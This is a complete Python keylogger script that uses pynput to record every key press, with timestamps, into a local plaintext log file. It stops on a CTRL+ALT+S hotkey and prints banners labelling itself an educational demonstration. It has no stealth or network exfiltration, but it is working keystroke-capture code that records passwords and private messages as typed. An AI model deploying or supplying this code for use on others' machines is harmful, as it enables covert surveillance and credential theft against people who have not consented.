from pynput import keyboard
from datetime import datetime
import threading
import sys

LOG_FILE = "keystrokes.log"
STOP_HOTKEY = {keyboard.Key.ctrl_l, keyboard.Key.alt_l, keyboard.KeyCode.from_char('s')}


class KeyLogger:
    def __init__(self):
        self.current_keys = set()
        self.listener = None
        self.running = False

    def on_press(self, key):
        """Handle key press events"""
        try:
            # Record key with timestamp
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
            log_entry = f"{timestamp} - Pressed: {key}\n"

            with open(LOG_FILE, "a", encoding="utf-8") as f:
                f.write(log_entry)

            # Check stop hotkey
            if key in STOP_HOTKEY:
                self.current_keys.add(key)
                if all(k in self.current_keys for k in STOP_HOTKEY):
                    self.stop()

        except Exception as e:
            print(f"Error: {str(e)}")

    def on_release(self, key):
        """Handle key release events"""
        try:
            if key in self.current_keys:
                self.current_keys.remove(key)
        except KeyError:
            pass

    def start(self):
        """Start logging thread"""
        self.running = True
        self.listener = keyboard.Listener(
            on_press=self.on_press,
            on_release=self.on_release
        )
        self.listener.start()
        print(f"Logging started. Press CTRL+ALT+S to stop. Logging to: {LOG_FILE}")
        self.listener.join()

    def stop(self):
        """Stop logging gracefully"""
        if self.running:
            self.running = False
            self.listener.stop()
            print("\nLogging stopped. Clean exit.")
            sys.exit(0)


if __name__ == "__main__":
    print("Educational Keylogger Demonstration")
    print("-----------------------------------")
    print("This is for academic study only!")
    print("You must STOP this program immediately if you don't have explicit permission to run it.")

    logger = KeyLogger()
    try:
        logger.start()
    except KeyboardInterrupt:
        logger.stop()